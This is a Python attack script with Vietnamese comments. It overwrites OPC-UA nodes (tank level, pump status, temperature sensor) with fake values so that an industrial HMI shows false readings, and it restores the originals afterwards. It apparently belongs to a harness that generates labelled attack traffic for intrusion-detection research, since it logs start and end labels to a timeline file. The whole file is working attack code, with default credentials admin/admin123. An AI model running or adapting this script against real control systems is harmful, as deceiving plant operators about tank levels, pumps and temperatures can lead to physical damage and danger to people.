"""
HMI_FAKE_DISPLAY
Kỹ thuật: Ghi đè giá trị OPC-UA node để HMI hiển thị sai
          mà không thay đổi giá trị thật trong PLC.
Observable: OPC-UA Write request bất thường

Gọi từ bash:
  python -m attacks_ext.hmi_fake_display \
      --duration 300 --opc-url opc.tcp://192.168.1.20:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
from attacks_ext.config_ext import base_parser, write_label

FAKE_NODES = [
    {"node_id": "ns=2;s=PLC.Tank1.Level",  "fake_value": 50.0,  "real_desc": "Mức nước bồn 1"},
    {"node_id": "ns=2;s=PLC.Pump1.Status", "fake_value": True,  "real_desc": "Trạng thái bơm 1"},
    {"node_id": "ns=2;s=PLC.Temp.Sensor1", "fake_value": 25.0,  "real_desc": "Nhiệt độ cảm biến 1"},
]


def run(args):
    label_prefix = "HMI_FAKE_DISPLAY"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s opc={args.opc_url}")

    iteration = 0
    try:
        from opcua import Client
        client = Client(args.opc_url)
        if hasattr(args, "opc_username") and args.opc_username:
            client.set_user(args.opc_username)
        if hasattr(args, "opc_password") and args.opc_password:
            client.set_password(args.opc_password)
        client.connect()
        print(f"[+] Đã kết nối OPC-UA: {args.opc_url}")

        original_values = {}
        for node_cfg in FAKE_NODES:
            node = client.get_node(node_cfg["node_id"])
            original_values[node_cfg["node_id"]] = node.get_value()
            print(f"[*] Giá trị gốc {node_cfg['real_desc']}: {original_values[node_cfg['node_id']]}")

        print("\n[!] Bắt đầu ghi đè giá trị giả...")
        end_time = time.time() + args.duration - 10

        while time.time() < end_time:
            for node_cfg in FAKE_NODES:
                node = client.get_node(node_cfg["node_id"])
                try:
                    node.set_value(node_cfg["fake_value"])
                    print(f"  [WRITE] {node_cfg['real_desc']} <- {node_cfg['fake_value']}")
                except Exception as e:
                    print(f"  [ERR] {node_cfg['node_id']}: {e}")
            iteration += 1
            time.sleep(2)

        print(f"\n[*] Đã thực hiện {iteration} lần ghi đè")
        print("[*] Khôi phục giá trị gốc...")
        for node_cfg in FAKE_NODES:
            node = client.get_node(node_cfg["node_id"])
            node.set_value(original_values[node_cfg["node_id"]])
            print(f"  [RESTORE] {node_cfg['real_desc']} <- {original_values[node_cfg['node_id']]}")

        client.disconnect()

    except ImportError:
        print("[ERR] opcua chưa được cài đặt. Cài: pip install opcua")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"iterations={iteration}")


def main():
    p = base_parser("HMI Fake Display Attack")
    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
    p.add_argument("--opc-username", default="admin")
    p.add_argument("--opc-password", default="admin123")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
